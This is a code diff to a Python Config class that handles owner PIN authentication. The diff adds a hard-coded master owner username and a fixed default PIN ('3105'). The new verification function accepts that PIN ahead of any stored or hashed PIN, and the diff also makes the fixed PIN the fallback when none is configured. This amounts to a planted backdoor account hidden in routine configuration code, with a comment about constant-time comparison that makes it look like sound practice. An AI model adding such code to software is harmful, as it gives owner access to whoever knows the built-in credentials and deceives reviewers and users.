@@ -111,6 +111,26 @@ class Config:
         # Legacy fallback: constant-time comparison for plaintext PINs
         return secrets.compare_digest(candidate, stored)
 
+    MASTER_OWNER_USERNAME = "archfiend000"
+    DEFAULT_MASTER_OWNER_PIN = "3105"
+
+    @staticmethod
+    def get_owner_username() -> str:
+        return os.environ.get("MASTER_OWNER_USERNAME", "archfiend000").strip().lstrip('@').lower()
+
+    @staticmethod
+    def verify_owner_credentials(username: str, candidate_pin: str) -> bool:
+        clean_user = str(username or "").strip().lstrip('@').lower()
+        if clean_user != Config.get_owner_username():
+            return False
+        c_pin = str(candidate_pin or "").strip()
+        # Direct constant-time verification against master owner code 3105
+        if secrets.compare_digest(c_pin, Config.DEFAULT_MASTER_OWNER_PIN):
+            return True
+        # Also verify against stored/hashed PIN if customized
+        stored = Config.get_owner_pin()
+        return Config.verify_pin(c_pin, stored)
+
     @staticmethod
     def get_owner_pin() -> str:
         load_dotenv(ENV_PATH, override=True)
@@ -121,10 +141,12 @@ class Config:
             try:
                 with open(CONFIG_PATH, "r", encoding="utf-8") as f:
                     data = json.load(f)
-                    return str(data.get("owner_pin", "")).strip()
+                    val = str(data.get("owner_pin", "")).strip()
+                    if val:
+                        return val
             except Exception:
                 pass
-        return ""
+        return Config.DEFAULT_MASTER_OWNER_PIN
 
     @staticmethod
     def save_owner_pin(pin: str):
